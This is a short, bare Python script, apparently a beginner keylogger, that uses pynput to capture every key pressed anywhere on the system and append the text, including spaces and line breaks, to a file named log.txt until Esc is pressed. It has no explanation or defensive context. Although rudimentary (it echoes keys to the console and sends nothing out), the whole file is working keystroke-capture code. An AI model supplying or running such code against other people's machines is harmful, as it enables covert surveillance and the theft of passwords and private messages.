from pynput import keyboard

def on_press(key):
    try:
        print(str(key).replace("'","").format(key.char))

        with open("log.txt", "a") as f:
            f.write(str(key).replace("'","").format(key.char))
            
    except AttributeError:
        print(f"Key {key} pressed".format(key))

        with open("log.txt", "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
# Collects events until released
with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()

